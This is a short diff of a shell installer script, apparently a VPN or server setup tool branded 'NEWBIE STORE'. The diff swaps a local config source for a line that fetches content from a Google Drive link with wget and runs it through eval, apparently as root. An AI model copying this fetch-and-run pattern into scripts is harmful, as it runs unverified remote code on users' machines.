@@ -25,7 +25,7 @@ Suffix="\033[0m"
 NC='\e[0m'
 nama='NEWBIE STORE'
 #################
-source /usr/bin/var.conf
+eval $(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")
 rm -r /root/izin &> /dev/null
 if ! command -v jq &> /dev/null; then
     echo -e "Tunggu sebentar proses. Menginstall Cloudflare..."
